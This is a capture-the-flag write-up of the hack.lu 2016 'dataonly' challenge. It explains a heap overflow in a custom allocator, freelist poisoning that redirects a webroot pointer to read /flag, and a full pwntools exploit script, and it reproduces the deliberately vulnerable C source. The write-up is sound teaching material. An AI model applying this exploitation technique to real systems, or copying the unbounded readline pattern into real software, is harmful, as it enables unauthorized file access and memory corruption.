---
layout: post
title: "hack.lu CTF 2016: dataonly"
author: f0rki
categories: writeup
tags: [cat/pwn, tool/pwntools, vuln/heap, vuln/bufferoverflow, vuln/customa-lloctor]
---

* **Category:** Exploiting
* **Points:** 200
* **Description:**

>
> Cthulhu is too chaotic and has lost the machine with his files. Cthulhu still
> has an old fileserver running on it though... Get the flag from /flag in the
> filesystem.
>
> Connect to cthulhu.fluxfingers.net:1509.
>

[binaries](https://cthulhu.fluxfingers.net/static/chals/dataonly_24001a4e2a4cfb06392de6c887e8101b.tar)

## Write-up

```
$ ls -R dataonly_release/
dataonly_release/:
cfi.asm  compile.sh*  launch*  launch.c  main.c  public/  server*  server.c

dataonly_release/public:
index.html
```

So basically `server` is just the tcp server. On each connection it will `fork`
and `exec` the `launch` binary. `launch` is built from `launch.c` and `main.c`.
`launch.c` contains the main function and does some setup, then control is
passed to the `DO_app_main` function from `main.c` and that's where all the
intersting code is.

If we take a look at `compile.sh`, we can see that the generated asm code of
`main.c` is processed so that it uses a unnamed temporary file at fd 3 as a
call stack. So we cannot modify return addresses. Furthermore `main.c` is
completely self-contained. It doesn't call any dynamically linked functions. So
attacking via the GOT is also infeasible. The challenge name already hints and
the way the binary is built pretty much confirms  that we will have to perform
an attack without hijacking the control flow.

### The heap implementation

Since `main.c` is completely self-contained it also includes standard functions
that are normally provided by the `libc` of the system. The usual string
processing and read/write function are there and also most interestingly a heap
implementation:

- In the beginning 10MB of heap space are `mmap`ed
- There are 9 different sizes of allocated chunks.
- For each size a single-linked freelist is maintained, with the head of the
  list stored in `malloc_freelist_heads[idx]`.
- An allocated chunk looks like `[ idx | memory ]` where idx is a byte
  containing the index into the freelist array. From `idx` one can derive the
  size of the chunk with `(1 << (idx + 4))`.
- A freed chunk loks like `[ ptr | memory ]`, where ptr is a pointer to the
  next free chunk in the freelist or `NULL` if it's the last one.
- `DO_malloc` tries to return the head of the freelist and only if the current
  freelist head for that particular size is `NULL` it will create a new chunk
  at `malloc_next_alloc`.
- We can allocate a maximum of `0x1fff` bytes, otherwise `malloc` will fail
  hard in `DO_chunk_idx_by_len`.

I calculated the sizes of the chunks and the interval of lengths for each of
the possible `idx` values. I will call them bins further, because it kind of
reminded me of the glibc fastbins.

```
[*] bin 0 len [0; 15] chunk size = 16
[*] bin 1 len [16; 31] chunk size = 32
[*] bin 2 len [32; 63] chunk size = 64
[*] bin 3 len [64; 127] chunk size = 128
[*] bin 4 len [128; 255] chunk size = 256
[*] bin 5 len [256; 511] chunk size = 512
[*] bin 6 len [512; 1023] chunk size = 1024
[*] bin 7 len [1024; 2047] chunk size = 2048
[*] bin 8 len [2048; 4095] chunk size = 4096
[*] bin 9 len [4096; 8191] chunk size = 8192
```

The relevant global variables for the heap management are:

```c
#define MALLOC_NR_OF_SIZES 10

void *malloc_freelist_heads[MALLOC_NR_OF_SIZES];
char *malloc_area_head;
char *malloc_next_alloc;
size_t malloc_area_size = 10 * 4096 * 4096; // 10MB of heap are enough for everyone

#define CHUNK_SIZE_BY_IDX(idx) (1 << (idx + 4))
```

### A heap-based buffer overflow

There is a rather obvious buffer overflow in `DO_readline`. It allocates the
largest possible buffer and then reads into this buffer byte by byte from
`stdin` until it encounters a newline. It fails to check whether this goes out
of bounds of the allocated buffer.

```c
char *DO_readline(size_t *outlen) {
  size_t len = CHUNK_SIZE_BY_IDX(MALLOC_NR_OF_SIZES-1) - 1;
  char *buf = DO_malloc(len);
  char *p = buf;
  while (1) {
    *p = DO_readbyte();
    if (*p == '\n') {
      *p = '\0';
      if (outlen)
        *outlen = p - buf;
      break;
    }
    p++;
  }
  return buf;
}
```

So we have a heap based buffer overflow. In modern heap implementations there
are certain integrity checks on the metadata of heap objects, so this kind of
vulnerability would be hard or maybe even impossible to exploit with for
example the glibc heap. Fortunately this is not the case for this challenge :)


### A dataonly way to /flag

So according to the description our goal is to read `/flag`. This means we have
to somehow manipulate the `DO_send_file` function, so that it opens a file
outside of the `webroot` directory. We can see that this is set to `./public/`
by default. Yes they checked for path traversal ;)

We can achieve this if we can set the `webroot` pointer or overwrite the
contents of the string `webroot` points to.  In the end we did overwrite
`webroot` and set it to point to an empty string.  Then we can send full paths
to the `get` command. Since the only vulnerability we spotted is the linear
heap based buffer overflow we probably have to abuse the heap implementation
somehow, otherwise we won't be able to reach the global variables.


### Interacting with the Heap

Let's see how we can interact with the binary:

```
help
get: receive a file - send path on a separate line
language: set language - send name of new language on a separate line
help: show this help
quit: let the server terminate the connection
get
command understood, please send a path
index.html
<!DOCTYPE html>
<html>
  <head>
    <title>Hello World!</title>
  </head>
  <body>
    Hello World!
  </body>
</html>
language
german
```

So the two relevant commands are `get` and `language`. Let's see how they work
in terms of the heap.

While performing `get index.html` the heap looks like this at the end of
`send_file`:

```
legend: [pseudo-addr: | (u8 idx | u64 freelist ptr ) | (data | variable name) ]
[0x1: | 9 | command ]
[0x2: | 9 | path ]
[0x3: | 1 | "./public/index.html ]
[0x4: | 8 | tmp ]
```

then everything is freed and we have the following free lists:

```
2: [3]
5: [4]
9: [1, 2]
```

Note that we can control the size of the third allocation by sending a longer
path.

```c
      if (DO_streq(command, "get")) {
        DO_write("command understood, please send a path\n");
        char *path = DO_readline(NULL);
        DO_send_file(path);
        DO_free(path);
      }
```

```c
void DO_send_file(char *path) {
  size_t root_len = DO_strlen(webroot);
  size_t path_len = DO_strlen(path);

  for (int i=0; i<(long)path_len - 1; i++) {
    if (path[i] == '.' && path[i+1] == '.') {
      DO_write("would be kinda lame if that worked...\n");
      return;
    }
  }

  char *full_path = DO_malloc(root_len + path_len + 1);
  DO_memcpy(full_path, webroot, root_len);
  DO_memcpy(full_path + root_len, path, path_len + 1);
  int fd = DO_sys_open(full_path);
  if (fd < 0) {
    DO_write("unable to open file\n");
  } else {
    char *tmp = DO_malloc(4095);
    while (1) {
      long res = DO_sys_read(fd, tmp, 4095);
      if (res <= 0)
        break;
      DO_sys_write(STDOUT_FD, tmp, res);
    }
    DO_free(tmp);
    DO_sys_close(fd);
  }
  DO_free(full_path);
}
```

When we perform `language german` as a first command, we have:

```
[0x1: | 9 | command ]
[0x2: | 9 | new_language ]
[0x3: | 0 | "german" ]
```

Note that the third allocation is not freed, because a reference is kept in the
`language` global variable. So only in the freelist for bin 9 we have the
command and new language buffer:

```
9: [1, 2]
```

```c
void DO_set_language(void) {
  DO_free(language);
  language = NULL;
  size_t linelen;
  char *new_language = DO_readline(&linelen);
  if (*new_language) {
    // save memory
    language = DO_malloc(linelen+1);
    DO_memcpy(language, new_language, linelen + 1);
  }
  DO_free(new_language);
}
```

Note that

- We can overflow every call to `DO_readline(NULL)`
  - overflow the `command` buffer
  - overflow the `path` buffer via `get` command
- We cannot overflow `DO_readline(&linelen)` in `DO_set_language` because this
  will be used as malloc param later and this will fail hard (because of malloc
  size limit)


### Exploitation Attempt 1

1. Perform `language` command and set to `X`

   ```
   [0x1: | 0x2 | ... ]
   [0x2: | 0x0 | ... ]
   [0x3: | 0 | "X" ]
   ```
   
   The freelist for bin 9 is `[0x1, 0x2]`
2. Send invalid command overflow into `0x2`

   ```
   [0x1: | 9 | AAAAAAAA... ]
   [0x2: | (&webroot-1) | ... ]
   [0x3: | 0 | "X" ]
   ```
   
3. Perform `language` command and set to `X`, this triggers a malloc of the
   chunk at `0x2`, which will write the fake freelist pointer into the freelist
   of bin 9.
   
   ```
   [0x1: | 9 | command ]
   [0x2: | 9 | language ]
   [0x3: | 0 | "X" ]
   ```
   
   after freeing everything the freelist for bin 9 is
   
   ```
   [0x1, 0x2, (&webroot-1)]
   ```

No if we trigger 3 allocations in bin 9, we get back the address of webroot
(which isn't affected by ASLR btw.). We need to subtract 1, because malloc
reserves the one byte for the `idx` value in front of the chunk.

So we can trigger this third allocation by supplying a language string that's
at least 4096 bytes long. We can do this and overwrite the webroot pointer.
Unfortunately then the program then segfaults when it tries to write past the
webroot pointer somwhere into unmapped memory. Well seems like this needs more
trickery.


### Exploitation attempt 2

OK so we need to write less data at webroot. One way to write less data is to
abuse the `DO_send_file` funciton. If we can trick `malloc` to return a pointer
of our choice in line 201 of main.c then it will copy `"./public/{whatever}"`
at this location. We can freely control the `{whatever}` part, since that's the
parameter to `get`.

OK so we need to put the `&webroot` pointer somewhere in one of the first
couple of bins, so that we can write less memory. Optimal would be the 0 bin.

Let's walk through the final exploit:

1. First perform `get index.html`, this
   1. puts a chunk into the freelist of bin 8, so that we can safely perform
      `get` again, even if we messed up the `malloc_next_alloc` pointer.
   2. puts a chunk into the freelist of bin 1, which was allocated for
      the `full_path`, which is `"./public/index.html"`
   
   State of the heap at the end is:
   
   ```
   [0x1: | 0x2 | ... ] <- heads[9]
   [0x2: | NULL | ... ]
   [0x3: | NULL | ... ] <- heads[1]
   [0x4: | NULL | ... ] <- heads[8]
   ```
   
2. Overflow heap with an invalid command, keep chunk at `0x2` intact and
   manipulate freelist pointer in chunk at `0x3`
   
   ```
   [0x1: | 9 | AAAAAAAA.... ]
   [0x2: | \x00\x00\x00\x00 | AAAAAA... ] <- heads[9]
   [0x3: | addr | ... ] <- heads[1]
   [0x4: | NULL | ... ] <- heads[8]
   ```
   
3. Trigger allocation in bin 1 with the `language` command

   ```
   [0x1: | 9 | command: "language"]
   [0x2: | 9 | new_language: "Y" * 16 ]
   [0x3: | 2 | language: "Y" * 16 ]
   [0x4: | NULL | ... ] <- heads[8]
   ```
   
   This will write `addr` to the top of the freelist of bin 1 and the chunk at
   `0x3` stays allocated, i.e. `heads[1] == addr`.

   We chose addr to be something we can later use to manipulate the freelist
   heads. We computed `addr` in the following way:
   
   ```python
   webroot = "./public/"

   # the address we want to write to malloc_freelist_heads[0]
   w_real_addr = p64(velf.symbols['webroot'] - 1)
   # the padding we need so that this is allocated in bin 1
   w_addr_pad = "X" * (16 - strlen(w_real_addr))
   w_addr =  w_addr_pad + w_real_addr

   # we want to write to malloc_freelist_heads[0]
   addr = velf.symbols["malloc_freelist_heads"]
   addr -= len(webroot)   # get first copies "./public/"
   addr -= len(w_addr_pad)  # padding to allocate in bin 1
   addr -= 1  # malloc returns ptr+1
   ```

   Sothe next allocation in bin 1 will return a pointer that we can use to
   manipulate the actual freelist headers.

4. Perform `get` command to corrupt the freelist heads

   ```python
   vp.sendline("get")
   vp.sendline(w_addr)
   ```
   
   so the freelist head of bin 0 now is `&webroot - 1`.

5. Use `language` command to manipulate the `webroot` global variable.
   Allocating in bin 0, will now return the desired address.
   
   ```python
   vp.sendline("language")
   vp.sendline(p64(0x004014a2))  # just one of the pointers to a NULL byte
   ```
   
6. `get /flag`. Unfortunately by now the freelist head of bin 0 is fubar. So 
   we cannot just send `/flag` because then `full_path` will be allocated 
   in bin 0 in.
   This means we have to allocate in another bin. We allocated in bin 1 by
   prepending a couple of `'/'` chars.
   
   ```python
   vp.sendline("get")
   vp.sendline("/" * (16 - 4) + "flag")
   ```
   
7. read and submit flag :)

   ```
   flag{cthulhu_likes_custom_mallocators}
   ```


For reference, the full exploit script is this:

```python
#!/usr/bin/env python

from pwn import *

def strlen(x):
    i = 0
    for c in x:
        if c == "\x00":
            break
        i += 1
    return i

chunk_size_by_idx = lambda idx: (1 << (idx + 4))

def chunk_idx_by_len(length):
     ci = 0
     while chunk_size_by_idx(ci) < length:
         ci += 1
     return ci

bins = [[0x2000, 0, chunk_size_by_idx(k)] for k in range(10)]
for i in range(0x2000):
    idx = chunk_idx_by_len(i + 1)
    if i < bins[idx][0]:
        bins[idx][0] = i
    if i > bins[idx][1]:
        bins[idx][1] = i

# for b, (min_, max_, size) in enumerate(bins):
#     log.info("bin {} len [{}; {}] chunk size = {}".format(b, min_, max_, size))

velf = ELF("./launch")
# dealarm the binary for debugging
webroot = "./public/"
index = "index.html"
# vp = process(['./mlaunch', webroot])  # with alarm noped out
# gdb.attach(vp, execute="""
# init-peda
# break main.c:276
# break main.c:231
# break main.c:201
# """)

vp = remote("cthulhu.fluxfingers.net", 1509)

context.log_level = 'debug'


w_real_addr = p64(velf.symbols['webroot'] - 1)
w_addr_pad = "X" * (bins[1][0] - strlen(w_real_addr))
w_addr =  w_addr_pad + w_real_addr

addr = velf.symbols["malloc_freelist_heads"] - len(webroot) - len(w_addr_pad)
addr -= 1

vp.sendline("get")
vp.recvline()
vp.sendline(index)
for _ in range(9):
    vp.recvline()

pl = "A" * bins[9][1]
pl += "\x00" * bins[9][2]
pl += p64(addr)
if "\n" in pl:
    log.warn("newline in payload!\n" + hexdump(pl))
log.info("triggering heap overflow")
vp.sendline(pl)
vp.recvline()

vp.sendline("language")
vp.sendline("Y" * bins[1][0])  # allocate in bin 1, free(NULL)

# top of freelist[1] is now addr

vp.sendline("get")
vp.recvline()
vp.sendline(w_addr)
vp.recvline()

vp.sendline("language")
vp.sendline(p64(0x004014a2))  # just a pointer to a NULL byte

vp.sendline("get")
vp.sendline("/" * (bins[1][0] - 4) + "flag")

vp.interactive()

vp.sendline("quit")
vp.close()
```

and also the `main.c` source code

```c
#include <x86_64-linux-gnu/asm/unistd_64.h>
#include <asm-generic/mman-common.h>
#include <asm-generic/fcntl.h>

#define size_t unsigned long
#define NULL ((void*)0)
#define false 0
#define true 1
#define bool int

#define STDIN_FD 0
#define STDOUT_FD 1
#define STACK_FD 3


/* syscall wrapper, accepts up to 5 arguments after the syscall number */
extern long DO_syscall(int syscall, ...);


/* ==== syscalls and important low-level stuff ==== */
void DO_fatal(char *str);

long DO_sys_read(int fd, char *buf, size_t len) {
  if (fd == STACK_FD)
    DO_fatal("error: bad fd passed to DO_sys_read\n");
  return DO_syscall(__NR_read, fd, buf, len);
}

long DO_sys_write(int fd, char *buf, size_t len) {
  if (fd == STACK_FD)
    DO_fatal("error: bad fd passed to DO_sys_write\n");
  return DO_syscall(__NR_write, fd, buf, len);
}

void *DO_mmap(size_t length) {
  // TODO add arg6 and properly zero it
  void *res = (void*)DO_syscall(__NR_mmap, NULL, length, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, 0);
  if ((unsigned long)res > (unsigned long)-4096)
    DO_fatal("error: mmap failed\n");
  return res;
}

void DO_sys_exit_group(int status) {
  DO_syscall(__NR_exit_group, status);
}

void DO_exit(int status) {
  while (1) DO_sys_exit_group(status);
}

size_t DO_strlen(char *str) {
  size_t res = 0;
  while (*str != '\0') {
    str++;
    res++;
  }
  return res;
}

void DO_write(char *str) {
  DO_sys_write(STDOUT_FD, str, DO_strlen(str));
}

void DO_fatal(char *str) {
  DO_write(str);
  DO_exit(1);
}

void DO_memcpy(void *dst, void *src, size_t len) {
  char *dst_ = dst;
  char *src_ = src;
  while (len--)
    *(dst_++) = *(src_++);
}

bool DO_streq(char *a, char *b) {
  while (1) {
    if (*a != *b)
      return false;
    if (*a == '\0')
      return true;
    a++;
    b++;
  }
}

int DO_sys_open(char *path) {
  int res = DO_syscall(__NR_open, path, O_RDONLY);
  return res;
}

void DO_sys_close(int fd) {
  if (fd == STACK_FD)
    DO_fatal("error: tried to close STACK_FD\n");
  DO_syscall(__NR_close, fd);
}



/* ==== malloc ==== */
#define MALLOC_NR_OF_SIZES 10

void *malloc_freelist_heads[MALLOC_NR_OF_SIZES];
char *malloc_area_head;
char *malloc_next_alloc;
size_t malloc_area_size = 10 * 4096 * 4096; // 10MB of heap are enough for everyone

void DO_setup_malloc(void) {
  malloc_area_head = DO_mmap(malloc_area_size);
  malloc_next_alloc = malloc_area_head;
}
#define CHUNK_SIZE_BY_IDX(idx) (1 << (idx + 4))
size_t DO_chunk_size_by_idx(int idx) {
  if (idx < 0 || idx > MALLOC_NR_OF_SIZES - 1)
    DO_fatal("error: bad chunk size idx");
  return CHUNK_SIZE_BY_IDX(idx);
}

int DO_chunk_idx_by_len(size_t len) {
  if (len > CHUNK_SIZE_BY_IDX(MALLOC_NR_OF_SIZES-1))
    DO_fatal("error: too big for malloc\n");
  int chunk_idx = 0;
  while (CHUNK_SIZE_BY_IDX(chunk_idx) < len)
    chunk_idx++;
  return chunk_idx;
}

void *DO_malloc(size_t len) {
  if ((long)len == -1)
    DO_fatal("error: absurdly huge memory allocation\n");
  len++;

  int idx = DO_chunk_idx_by_len(len);

  char *res = malloc_freelist_heads[idx];
  if (res == NULL) {
    len = DO_chunk_size_by_idx(idx);
    if (malloc_area_size - (malloc_next_alloc - malloc_area_head) <= len)
      DO_fatal("error: out of heap space\n");
    res = malloc_next_alloc;
    malloc_next_alloc += len;
  } else {
    malloc_freelist_heads[idx] = *(void**)res;
  }
  res[0] = idx;
  return res + 1;
}

void DO_free(void *ptr) {
  if (ptr == NULL)
    return;
  ptr = ((char*)ptr)-1;
  int idx = *(char*)ptr;

  *(void**)ptr = malloc_freelist_heads[idx];
  malloc_freelist_heads[idx] = ptr;
}

/* ==== application code ==== */
char *webroot;
char *language;

char DO_readbyte(void) {
  char c;
  long res = DO_sys_read(STDIN_FD, &c, 1);
  if (res == 0)
    DO_exit(0);
  if (res != 1)
    DO_fatal("error: read failed\n");
  return c;
}

char *DO_readline(size_t *outlen) {
  size_t len = CHUNK_SIZE_BY_IDX(MALLOC_NR_OF_SIZES-1) - 1;
  char *buf = DO_malloc(len);
  char *p = buf;
  while (1) {
    *p = DO_readbyte();
    if (*p == '\n') {
      *p = '\0';
      if (outlen)
        *outlen = p - buf;
      break;
    }
    p++;
  }
  return buf;
}

void DO_send_file(char *path) {
  size_t root_len = DO_strlen(webroot);
  size_t path_len = DO_strlen(path);

  for (int i=0; i<(long)path_len - 1; i++) {
    if (path[i] == '.' && path[i+1] == '.') {
      DO_write("would be kinda lame if that worked...\n");
      return;
    }
  }

  char *full_path = DO_malloc(root_len + path_len + 1);
  DO_memcpy(full_path, webroot, root_len);
  DO_memcpy(full_path + root_len, path, path_len + 1);
  int fd = DO_sys_open(full_path);
  if (fd < 0) {
    DO_write("unable to open file\n");
  } else {
    char *tmp = DO_malloc(4095);
    while (1) {
      long res = DO_sys_read(fd, tmp, 4095);
      if (res <= 0)
        break;
      DO_sys_write(STDOUT_FD, tmp, res);
    }
    DO_free(tmp);
    DO_sys_close(fd);
  }
  DO_free(full_path);
}

void DO_set_language(void) {
  DO_free(language);
  language = NULL;
  size_t linelen;
  char *new_language = DO_readline(&linelen);
  if (*new_language) {
    // save memory
    language = DO_malloc(linelen+1);
    DO_memcpy(language, new_language, linelen + 1);
  }
  DO_free(new_language);
}

void DO_app_main(char *webroot_) {
  webroot = webroot_;
  DO_setup_malloc();

  while (1) {
    char *command = DO_readline(NULL);
    if (language != NULL && DO_streq(language, "german")) {
      if (DO_streq(command, "hole")) {
        DO_write("kommando verstanden, bitte pfad senden\n");
        char *path = DO_readline(NULL);
        DO_send_file(path);
        DO_free(path);
      } else if (DO_streq(command, "sprache")) {
        DO_set_language();
      } else if (DO_streq(command, "hilfe")) {
        DO_write("hole: hole datei - sende pfad in neuer zeile\n");
        DO_write("sprache: sprache aendern - sende name der sprache in neuer zeile\n");
        DO_write("hilfe: zeige diese hilfe\n");
        DO_write("ende: verbindung schliessen\n");
      } else if (DO_streq(command, "ende")) {
        DO_write("tschuess!\n");
        DO_exit(0);
      } else {
        DO_write("unbekanntes kommando - sende \"hilfe\" für hilfe\n");
      }
    } else { // must be english
      if (DO_streq(command, "get")) {
        DO_write("command understood, please send a path\n");
        char *path = DO_readline(NULL);
        DO_send_file(path);
        DO_free(path);
      } else if (DO_streq(command, "language")) {
        DO_set_language();
      } else if (DO_streq(command, "help")) {
        DO_write("get: receive a file - send path on a separate line\n");
        DO_write("language: set language - send name of new language on a separate line\n");
        DO_write("help: show this help\n");
        DO_write("quit: let the server terminate the connection\n");
      } else if (DO_streq(command, "quit")) {
        DO_write("bye!\n");
        DO_exit(0);
      } else {
        DO_write("bad command - try sending \"help\" for help\n");
      }
    }
    DO_free(command);
  }
}
```
